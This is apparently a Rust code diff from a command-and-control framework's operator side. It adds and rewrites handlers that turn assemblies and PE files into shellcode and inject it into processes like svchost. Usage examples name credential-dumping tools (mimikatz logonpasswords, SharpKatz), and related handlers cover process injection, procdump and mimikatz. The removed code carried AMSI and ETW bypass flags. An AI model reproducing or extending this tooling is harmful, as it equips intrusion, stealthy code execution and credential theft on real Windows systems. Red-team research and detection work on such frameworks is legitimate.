@@ -49,76 +49,75 @@ pub fn process_inject(links: web::Data<Links>, link_index: usize, command: Vec<S
         .set_command(updated_command.join(" "), command.join(" "));
 }
 
-pub fn execute_assembly(links: web::Data<Links>, link_index: usize, mut command: Vec<String>) {
-    if command.len() == 2 {
-        command.push(" ".to_string());
-    }
+pub fn execute_shellcode(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
     if command.len() < 3 {
-        println!("execute-assembly <path-to-assembly> <parameters>\n    eg: execute-assembly /tmp/SharpTool.exe -all");
+        println!("execute-shellcode <process> <path-to-shellcode> <parameters>\n   eg: execute-shellcode svchost /tmp/shellcode.bin");
         return;
     }
-    // check for SharpCollection
-    let mut sharpcollection_tool = String::new();
-    if command[0] == *"sharp" {
-        sharpcollection_tool = command[1].clone();
-        let tool_path = util::sharp::get_sharp_path(command[1].clone());
-        if tool_path.is_empty() {
-            println!("could not find tool, at the main menu the following command may help:");
-            println!("sharp init");
-            return;
-        }
-        command[0] = "execute-assembly".to_string();
-        command[1] = tool_path;
-    }
-    // 0 name
-    let mut updated_command: Vec<String> = vec![command[0].clone()];
-    // 1 assembly
-    let assembly = match std::fs::read(command[1].clone()) {
+    let shellcode = match std::fs::read(command[2].clone()) {
         Err(e) => {
             println!("{}", e);
             return;
         }
-        Ok(assembly) => assembly,
+        Ok(shellcode) => shellcode,
     };
-    let assembly_b64 = base64::encode(assembly);
-    updated_command.push(assembly_b64);
-    // 2 hostingdll
-    let hostingclr_dll = include_bytes!("../assets/HostingCLRx64.dll");
-    let hostingclr_dll_b64 = base64::encode(hostingclr_dll);
-    updated_command.push(hostingclr_dll_b64);
-    // 3 process
-    updated_command.push("svchost".to_string());
-    // 4 amsi bool
-    updated_command.push("true".to_string());
-    // 5 etw bool
-    updated_command.push("true".to_string());
-    // 6 parameters
-    updated_command.extend_from_slice(&command[2..]);
+    let shellcode_b64 = base64::encode(shellcode);
+    let mut updated_command = command.clone();
+    updated_command[2] = shellcode_b64;
+    links.links.lock().unwrap()[link_index]
+        .set_command(updated_command.join(" "), command.join(" "));
+}
 
-    // update original command if SharpCollection
-    if !sharpcollection_tool.is_empty() {
-        command[0] = "sharp".to_string();
-        command[1] = sharpcollection_tool;
+pub fn execute_assembly(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
+    if command.len() < 3 {
+        println!("execute-assembly <process> <path-to-assewmbly> <optional parameters>\n   eg: execute-assembly svchost SharpKatz.exe -h");
+        return;
     }
+    let parameters: Vec<String>;
+    if command.len() > 3 {
+        parameters = command.clone().split_off(3);
+    } else {
+        parameters = Vec::new();
+    }
+    let shellcode_b64 = match util::donut::create_shellcode(command[2].clone(), parameters) {
+        Some(b64) => b64,
+        None => {
+            println!("Could not generate shellcode");
+            return;
+        },
+    };
+    let updated_command = vec![
+        "execute-shellcode".to_string(),
+        command[1].clone(),
+        shellcode_b64
+    ];
     links.links.lock().unwrap()[link_index]
         .set_command(updated_command.join(" "), command.join(" "));
 }
 
 pub fn execute_pe(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
     if command.len() < 3 {
-        println!("execute-pe <path-to-pe> <args>\n   eg: execute-pe /tmp/mimikatz.exe sekurlsa::logonpasswords exit");
+        println!("execute-pe <process> <path-to-pe> <optional parameters>\n   eg: execute-pe svchost whoami.exe");
         return;
     }
-    let pe = match std::fs::read(command[1].clone()) {
-        Err(e) => {
-            println!("{}", e);
+    let parameters: Vec<String>;
+    if command.len() > 3 {
+        parameters = command.clone().split_off(3);
+    } else {
+        parameters = Vec::new();
+    }
+    let shellcode_b64 = match util::donut::create_shellcode(command[2].clone(), parameters) {
+        Some(b64) => b64,
+        None => {
+            println!("Could not generate shellcode");
             return;
-        }
-        Ok(pe) => pe,
+        },
     };
-    let pe_b64 = base64::encode(pe);
-    let mut updated_command = command.clone();
-    updated_command[1] = pe_b64;
+    let updated_command = vec![
+        "execute-shellcode".to_string(),
+        command[1].clone(),
+        shellcode_b64
+    ];
     links.links.lock().unwrap()[link_index]
         .set_command(updated_command.join(" "), command.join(" "));
 }
@@ -138,7 +137,7 @@ pub fn procdump(links: web::Data<Links>, link_index: usize, command: Vec<String>
 }
 
 pub fn mimikatz(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
-    if command.len() < 1 {
+    if command.len() > 1 {
         println!("mimikatz\n   eg: mimikatz");
         return;
     }
